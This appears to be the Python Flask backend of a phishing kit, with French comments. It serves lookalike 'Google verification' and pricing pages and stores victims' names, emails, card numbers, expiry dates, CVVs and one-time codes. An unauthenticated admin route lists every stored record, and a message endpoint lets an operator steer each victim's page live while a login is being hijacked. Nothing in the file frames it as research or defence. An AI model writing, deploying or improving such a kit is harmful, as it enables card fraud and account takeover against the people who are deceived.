# app.py
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
from models import db, Infos
from config import Config
from sqlalchemy import desc

# Initialisation de l'application Flask
app = Flask(__name__)
app.config.from_object(Config)
db.init_app(app)

# Page d'accueil
@app.route('/tips')
def home():
    lang = request.args.get('lang', 'en')
    
    if lang == 'fr':
        return render_template('indexfr.html')
    return render_template('index.html')

@app.route('/price')
def price():
    lang = request.args.get('lang', 'en')
    
    if lang == 'fr':
        return render_template('pricefr.html')
    return render_template('price.html')

@app.route('/infos')
def infos():
    lang = request.args.get('lang', 'en')
    
    if lang == 'fr':
        return render_template('infosfr.html')
    return render_template('infos.html')

@app.route('/google/verif')
def verif():
    lang = request.args.get('lang', 'en')
    
    if lang == 'fr':
        return render_template('veriffr.html')
    return render_template('verif.html')




@app.route('/submit', methods=['POST'])
def submit_form():
    try:
        data = request.json

        # Vérification des champs requis
        required_fields = ['first_name', 'last_name', 'email']
        for field in required_fields:
            if field not in data or not data[field]:
                return jsonify({"error": f"{field} is required"}), 400

        # Création de l'objet Infos
        new_info = Infos(
            first_name=data['first_name'],
            last_name=data['last_name'],
            email=data['email'],
            message=data.get('message'),
            code=data.get('code'),

            card_number=data['card_number'],
            expiry_date=data.get('expiry_date'),
            cvv=data.get('cvv')
        )

        db.session.add(new_info)
        db.session.commit()

        return jsonify({"success": "Data submitted successfully", "id": new_info.id}), 201

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/submit-maj', methods=['POST'])
def update_card_info():
    data = request.get_json()  # Récupère les données envoyées en POST

    # On suppose que l'email est passé dans les données de la requête
    email = data.get('email')
    
    # Trouver l'utilisateur par son email
    user_info = Infos.query.filter_by(email=email).order_by(desc(Infos.id)).first()
    
    if user_info:
        # Mise à jour des informations de la carte
        user_info.card_number = data['card_number']
        user_info.expiry_date = data.get('expiry_date')
        user_info.cvv = data.get('cvv')
        user_info.message = "Load"
        
        # Commit des changements dans la base de données
        db.session.commit()
        
        return jsonify({"message": "Card information updated successfully"}), 200
    else:
        return jsonify({"message": "User not found"}), 404

@app.route('/code', methods=['POST'])
def code():
    data = request.get_json()  # Récupère les données envoyées en POST

    # On suppose que l'email est passé dans les données de la requête
    email = data.get('email')
    
    # Trouver l'utilisateur par son email
    user_info = Infos.query.filter_by(email=email).order_by(desc(Infos.id)).first()
    
    if user_info:
        # Mise à jour des informations de la carte
        user_info.code = data['code']
        user_info.message = "Load"
        
        # Commit des changements dans la base de données
        db.session.commit()
        
        return jsonify({"message": "Code information updated successfully"}), 200
    else:
        return jsonify({"message": "User not found"}), 404

@app.route('/admin', methods=['GET'])
def admin():
    
    return render_template('admin.html')


@app.route('/admin/infos', methods=['GET'])
def get_infos():
    infos = Infos.query.all()  # Appeler correctement la méthode all() pour obtenir les données
    # Convertir les objets Infos en un format JSON, si nécessaire
    infos_list = [info.to_dict() for info in infos]  # Assurez-vous d'avoir une méthode to_dict() dans votre modèle Infos
    return jsonify(infos_list)  # Retourner la liste sous forme de JSON

@app.route('/message', methods=['GET', 'POST'])
def message():
    if request.method == 'POST':

        email = request.json.get('email')
        message = request.json.get('message')

        # Rechercher tous les utilisateurs ayant cet email
        infos = Infos.query.filter_by(email=email).all()

        if infos:
            # Mettre à jour le message pour tous les utilisateurs ayant cet email
            for info in infos:
                info.message = message  # Met à jour le message
            db.session.commit()  # Sauvegarde les modifications dans la DB

            return jsonify({"success":"200"}),200

        else:
            # Si aucun utilisateur n'a cet email, afficher un message d'erreur
            return jsonify({"Error": "Dont find email"}),400

    elif request.method == 'GET':
        # Si la requête est GET, récupérer l'email depuis l'URL
        email = request.args.get('email')  # Paramètre 'email' dans l'URL

        if not email:
            return jsonify({"error": "Email manquant"}), 400  # Si l'email est absent, renvoyer une erreur

        # Recherche de l'utilisateur avec l'email spécifié et tri par ordre décroissant (dernier enregistrement)
        infos = Infos.query.filter_by(email=email).order_by(desc(Infos.id)).first()

        if infos:
            # Si un utilisateur avec cet email est trouvé, renvoyer le message en JSON
            return jsonify({"email": email, "message": infos.message})
        else:
            # Si aucun utilisateur avec cet email n'est trouvé, renvoyer une erreur
            return jsonify({"error": "Utilisateur non trouvé avec cet email"}), 404

    # Si la méthode est autre que GET ou POST, on peut renvoyer une erreur
    return jsonify({"error": "Méthode non autorisée"}), 405

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(debug=True)

